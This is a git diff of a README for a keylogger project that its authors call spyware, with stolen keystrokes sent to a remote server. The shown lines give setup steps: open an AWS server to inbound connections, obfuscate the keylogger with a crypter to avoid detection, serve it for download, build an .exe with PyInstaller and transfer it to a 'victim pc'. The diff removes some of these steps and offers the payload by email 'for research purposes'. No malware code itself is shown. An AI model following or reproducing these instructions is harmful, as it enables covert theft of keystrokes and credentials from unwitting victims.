@@ -20,7 +20,8 @@ A spyware developed to hack hardware device(keyboard) and send it's data to the 
 ## Usage
 1.) Make a server online using AWS make necessary changes to allow inbound connections on port 8000 or the port of your choice.<br>
 <br>
-2.) In line 27 of the `stage2_keylogger.py` edit the url to match with your server ip and port. Obfuscate the stage2_keylogger.py file using the [FudCrypt](https://github.com/machine1337/fudcrypt) project. Then, serve it as a directly downloadable file on the flask app in the `/dwfile` route, you can do this by editing line 56 of `app.py` and providing the path to your edited and obfuscated `stage2_keylogger.py` stored on your AWS server.
+The original payload isn't provided to prevent malicious use, email us on admin@hacktivists.in to gain access to the original payload along with instructions of setting it up for research purposes. <br> 
+2.) Edit line 56 of `app.py` and providing the path to your edited and obfuscated `stage2_keylogger.py` provided by us after storing on your AWS server.)
 <br><br>
 3.) In line 106 of `app.py` add your username and password for route security<br>
 <br>
@@ -52,9 +53,8 @@ Now all you have to do is transfer the .exe file into the victim pc, preferably 
 - `sqlite3` - for database.
 - `flask` - for Webapp and REST API developement.
 - `gunicorn` - for implimenting WSGI ( Web Server Gateway Interface ).
-- `nginx` - for webserver acting as a reverse proxy to AWS.
+  
 
-  FOR CREATING THE VIRUS EXE, EDIT THE VIRUS CODE AND CREATE AN EXE USING PYINSTALLER 
 ## Contributors
 * [Abhishek Sharma](https://github.com/anonymous300502)
 
